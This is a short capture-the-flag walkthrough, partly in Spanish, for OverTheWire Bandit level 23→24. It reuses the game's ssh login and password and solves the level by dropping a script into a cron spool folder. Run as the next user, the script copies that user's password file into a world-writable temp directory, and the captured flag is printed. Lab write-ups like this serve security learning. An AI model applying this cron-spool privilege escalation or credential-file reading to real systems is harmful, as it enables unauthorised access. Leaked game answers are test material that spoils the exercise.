Bandit Level 23 → Level 24
Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)

ssh -p 2220  bandit23@bandit.labs.overthewire.org 
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n


Necesito leer este archivo, para saber la clave
bandit23@bandit:~$ cat /etc/bandit_pass/bandit24
cat: /etc/bandit_pass/bandit24: Permission denied  # no tengo acceso

CREO UN SCRIPT QUE VA A SER EJECUTADO X BANDIT24
-->script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.j7Z53OZEij/creypwned.txt

bandit23@bandit:~$ mktemp -d
/tmp/tmp.j7Z53OZEij

chmod o+rwx ../tmp.j7Z53OZEij	# asigno permisos a otros

bandit23@bandit:/tmp/tmp.j7Z53OZEij$ cp script.sh /var/spool/bandit24/script.sh
bandit23@bandit:/tmp/tmp.j7Z53OZEij$ watch -n 1 ls -l
bandit23@bandit:/tmp/tmp.j7Z53OZEij$ cat creypwned.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

